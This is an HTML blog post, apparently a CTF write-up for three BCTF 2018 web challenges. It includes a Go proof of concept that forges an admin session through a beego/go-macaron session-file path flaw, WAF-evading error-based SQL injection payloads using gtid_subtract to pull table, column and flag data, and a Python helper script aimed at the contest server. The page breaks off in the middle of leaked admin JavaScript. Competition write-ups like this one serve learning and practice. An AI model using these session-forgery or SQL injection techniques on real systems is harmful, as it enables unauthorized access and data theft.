@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="checkingo的sessionid没有过滤.&#x2F;的时候导致可以用任意文件作为session,可以在github上面看Nov11的commit https:&#x2F;&#x2F;github.com&#x2F;astaxie&#x2F;beego&#x2F;pull&#x2F;3383 go-macaron(https:&#x2F;&#x2F;github.com&#x2F;go-macaron&#x2F;session version&lt;0.4.0) beego(https:&#x2F;&#x2F;gith">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BCTF2018web(part1)">
+<meta property="og:url" content="http://example.com/2018/11/29/bctf2018webpart1/index.html">
+<meta property="og:site_name" content="blacsheep&#39;s blog">
+<meta property="og:description" content="checkingo的sessionid没有过滤.&#x2F;的时候导致可以用任意文件作为session,可以在github上面看Nov11的commit https:&#x2F;&#x2F;github.com&#x2F;astaxie&#x2F;beego&#x2F;pull&#x2F;3383 go-macaron(https:&#x2F;&#x2F;github.com&#x2F;go-macaron&#x2F;session version&lt;0.4.0) beego(https:&#x2F;&#x2F;gith">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/2018/11/2018-11-29-19-42-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/11/2018-11-29-19-42-38-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png">
+<meta property="article:published_time" content="2018-11-29T14:18:40.000Z">
+<meta property="article:modified_time" content="2023-07-10T02:13:29.444Z">
+<meta property="article:author" content="blacsheep">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2018/11/2018-11-29-19-42-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BCTF2018web(part1)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/11/05/2018%E9%AA%87%E6%9E%81%E6%9D%AFwebwp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/11/29/bctf2018webpart1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/11/29/bctf2018webpart1/&text=BCTF2018web(part1)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/11/29/bctf2018webpart1/&title=BCTF2018web(part1)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/11/29/bctf2018webpart1/&is_video=false&description=BCTF2018web(part1)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BCTF2018web(part1)&body=Check out this article: http://example.com/2018/11/29/bctf2018webpart1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/11/29/bctf2018webpart1/&title=BCTF2018web(part1)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/11/29/bctf2018webpart1/&title=BCTF2018web(part1)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/11/29/bctf2018webpart1/&title=BCTF2018web(part1)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/11/29/bctf2018webpart1/&title=BCTF2018web(part1)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/11/29/bctf2018webpart1/&name=BCTF2018web(part1)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/11/29/bctf2018webpart1/&t=BCTF2018web(part1)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babySQLiSPA"><span class="toc-number">2.</span> <span class="toc-text">babySQLiSPA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeaFaring1"><span class="toc-number">3.</span> <span class="toc-text">SeaFaring1</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        BCTF2018web(part1)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">blacsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-11-29T14:18:40.000Z" class="dt-published" itemprop="datePublished">2018-11-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E7%AF%87/">web篇</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>go的sessionid没有过滤<code>./</code>的时候导致可以用任意文件作为session,可以在github上面看Nov11的commit <a target="_blank" rel="noopener" href="https://github.com/astaxie/beego/pull/3383" title="https://github.com/astaxie/beego/pull/3383">https://github.com/astaxie/beego/pull/3383</a> go-macaron(<a target="_blank" rel="noopener" href="https://github.com/go-macaron/session">https://github.com/go-macaron/session</a> version&lt;0.4.0) beego(<a target="_blank" rel="noopener" href="https://github.com/astaxie/beego">https://github.com/astaxie/beego</a> version&lt;1.11.0)都存在这个洞 给出一个外国选手的poc</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/astaxie/beego/session&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    s := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">    s[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    s[<span class="string">&quot;UID&quot;</span>] = <span class="number">1</span></span><br><span class="line">    encoded_s, err:= session.EncodeGob(s)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    log.Printf(<span class="string">&quot;%v&quot;</span>, encoded_s)</span><br><span class="line">    decoded_s, err := session.DecodeGob(encoded_s)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    log.Printf(<span class="string">&quot;%v&quot;</span>, decoded_s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跑一下poc</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@Macbook:/home/blacsheep/Tools/MyWebTools/gogs  $ go run hatena_poc.go </span><br><span class="line">2018/11/29 19:37:16 [14 255 129 4 1 2 255 130 0 1 16 1 16 0 0 61 255 130 0 2 6 115 116 114 105 110 103 12 10 0 8 117 115 101 114 110 97 109 101 6 115 116 114 105 110 103 12 7 0 5 97 100 109 105 110 6 115 116 114 105 110 103 12 5 0 3 85 73 68 3 105 110 116 4 2 0 2]</span><br><span class="line">2018/11/29 19:37:16 map[username:admin UID:1]</span><br></pre></td></tr></table></figure>
+
+<p>丢到cyberchef的fromdecimal <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)&input=MTQgMjU1IDEyOSA0IDEgMiAyNTUgMTMwIDAgMSAxNiAxIDE2IDAgMCA2MSAyNTUgMTMwIDAgMiA2IDExNSAxMTYgMTE0IDEwNSAxMTAgMTAzIDEyIDEwIDAgOCAxMTcgMTE1IDEwMSAxMTQgMTEwIDk3IDEwOSAxMDEgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA3IDAgNSA5NyAxMDAgMTA5IDEwNSAxMTAgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA1IDAgMyA4NSA3MyA2OCAzIDEwNSAxMTAgMTE2IDQgMiAwIDI" title="https://gchq.github.io/CyberChef/#recipe=From_Decimal(&#39;Space&#39;,false)&amp;input=MTQgMjU1IDEyOSA0IDEgMiAyNTUgMTMwIDAgMSAxNiAxIDE2IDAgMCA2MSAyNTUgMTMwIDAgMiA2IDExNSAxMTYgMTE0IDEwNSAxMTAgMTAzIDEyIDEwIDAgOCAxMTcgMTE1IDEwMSAxMTQgMTEwIDk3IDEwOSAxMDEgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA3IDAgNSA5NyAxMDAgMTA5IDEwNSAxMTAgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA1IDAgMyA4NSA3MyA2OCAzIDEwNSAxMTAgMTE2IDQgMiAwIDI">https://gchq.github.io/CyberChef/#recipe=From_Decimal(‘Space’,false)&amp;input&#x3D;MTQgMjU1IDEyOSA0IDEgMiAyNTUgMTMwIDAgMSAxNiAxIDE2IDAgMCA2MSAyNTUgMTMwIDAgMiA2IDExNSAxMTYgMTE0IDEwNSAxMTAgMTAzIDEyIDEwIDAgOCAxMTcgMTE1IDEwMSAxMTQgMTEwIDk3IDEwOSAxMDEgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA3IDAgNSA5NyAxMDAgMTA5IDEwNSAxMTAgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA1IDAgMyA4NSA3MyA2OCAzIDEwNSAxMTAgMTE2IDQgMiAwIDI</a> 存个poc.jpg,上传改session,登录到admin <a href="/images/2018/11/2018-11-29-19-42-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/11/2018-11-29-19-42-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 然后adminpanel拿到flag <a href="/images/2018/11/2018-11-29-19-42-38-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/11/2018-11-29-19-42-38-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"></a></p>
+<h2 id="babySQLiSPA"><a href="#babySQLiSPA" class="headerlink" title="babySQLiSPA"></a>babySQLiSPA</h2><p>&#x2F;api&#x2F;hints可以注入 难点是绕过 mysql版本5.7.24,大多数几何函数无法使用.polygon可以爆库名和表名,但是没用,得去找flag表 这里mysql5.7之后新增的报错函数有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ST_LatFromGeoHash()</span><br><span class="line">    select ST_LatFromGeoHash(version());</span><br><span class="line">ST_LongFromGeoHash()</span><br><span class="line">    select ST_LongFromGeoHash(version());</span><br><span class="line">GTID_SUBSET()</span><br><span class="line">    select GTID_SUBSET(version(),1);</span><br><span class="line">GTID_SUBTRACT()</span><br><span class="line">    select GTID_SUBTRACT(version(),1);</span><br><span class="line">ST_PointFromGeoHash()</span><br><span class="line">    select ST_PointFromGeoHash(version(),1);</span><br></pre></td></tr></table></figure>
+
+<p>需要过的waf</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">checkHint</span> (hint) &#123;</span><br><span class="line"> <span class="keyword">return</span> ! <span class="regexp">/ ;\+-\*\/</span></span><br><span class="line"><span class="regexp">&lt;&gt;~!\d%\x09\x0a\x0b\x0c\x0d`gtid_subsethashjsonst\_updatexm</span></span><br><span class="line"><span class="regexp">lextractvaluefloorrandexpjson_keysuuid_to_binbin_to_uuidunionlike</span></span><br><span class="line"><span class="regexp">sleepbenchmark/ig</span>.<span class="title function_">test</span>(hint)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">data= &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;blacsheep11&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;blacsheep11&#x27;</span>&#125;</span><br><span class="line">r=u.post(<span class="string">&#x27;http://47.93.100.42:9999/api/login&#x27;</span>,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(src).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">src</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000000</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(i)[:<span class="number">6</span>]==<span class="built_in">str</span>(src):</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r=u.get(<span class="string">&#x27;http://47.93.100.42:9999/api/captcha&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    prefix= re.findall(<span class="string">r&#x27;&quot;captcha&quot;:&quot;(.&#123;6&#125;)&quot;&#125;&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    captcha = calc(prefix)</span><br><span class="line">    hint=<span class="built_in">input</span>(<span class="string">&#x27;hints:&#x27;</span>)</span><br><span class="line">    data=&#123;<span class="string">&#x27;captcha&#x27;</span>:captcha,<span class="string">&#x27;hint&#x27;</span>:hint&#125;</span><br><span class="line">    r=u.post(<span class="string">&#x27;http://47.93.100.42:9999/api/hints&#x27;</span>,data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>使用gtid_subtract绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hints:&#x27;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((table_schema=database()))),&#x27;&#x27;))or&#x27;</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;FdkuBNGoarFgVBwDjHcZBwwBFKNnkGDrIRubYZZtAGOifUogHPjXLyFhGxPfNWyE,Hints,MztsezsxCgHmgbYoeQGqKteosCHjfpXoGCFVjNPEpIKzFjCPYRmOMQAKgVCuoOZX,TLcLvkgTjVjFvBrUfhsqkZFMcRCVlqzEfTPxujYcwzQDtJRGzFRKqmxxapLckUBI&#x27;.&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现表名一片混乱,和pgg聊天的时候他说nu1l那边一直卡在表名这个地方2333 后来他们限定表名长度来提取的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hints:&#x27;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((length(table_name)=ord(&#x27;j&#x27;)^ord(&#x27;t&#x27;)))),&#x27;&#x27;))or&#x27;</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;vhEFfFlLlLaAAaaggIiIIsSSHeReEE&#x27;.&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>表名长度30的时候找到flag表,payload有长度限制,所以爆列名的时候稍微改一下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hints:&#x27;gtid_subtract((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;vhEFfFlLlLaAAaaggIiIIsSSHeReEE&#x27;)),&#x27;&#x27;)#</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO&#x27;.&quot;&#125;</span><br><span class="line">hints:&#x27;gtid_subtract((select(ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO)from(vhEFfFlLlLaAAaaggIiIIsSSHeReEE)),&#x27;&#x27;)#</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;BCTF&#123;060950FB-839E-4B57-B91D-51E78F56856F&#125;&#x27;.&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SeaFaring1"><a href="#SeaFaring1" class="headerlink" title="SeaFaring1"></a>SeaFaring1</h2><p>这题评论的链接会被机器人访问 注意到robots.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin/handle_message.php</span><br></pre></td></tr></table></figure>
+
+<p>curl一下&#x2F;admin 发现部分源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">view_uid</span>(<span class="params">uid</span>) &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;view_uid&quot;</span>, <span class="string">&quot;uid&quot;</span>: uid&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Status</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    $(<span class="string">&#x27;#timestamp&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;timestamp&#x27;</span>]);</span><br><span class="line">                    $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;user_name&#x27;</span>]);</span><br><span class="line">                    $(<span class="string">&#x27;#message&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;replyuid&quot;</span>).<span class="property">value</span>=data[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[<span class="string">&#x27;is_checked&#x27;</span>]) == <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;status&quot;</span>).<span class="property">innerHTML</span> = <span class="title class_">Status</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">view_unreads</span>(<span class="params"></span>) &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;view_unreads&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="number">0</span>&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="keyword">var</span> html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">var</span> tbody = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comments&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = 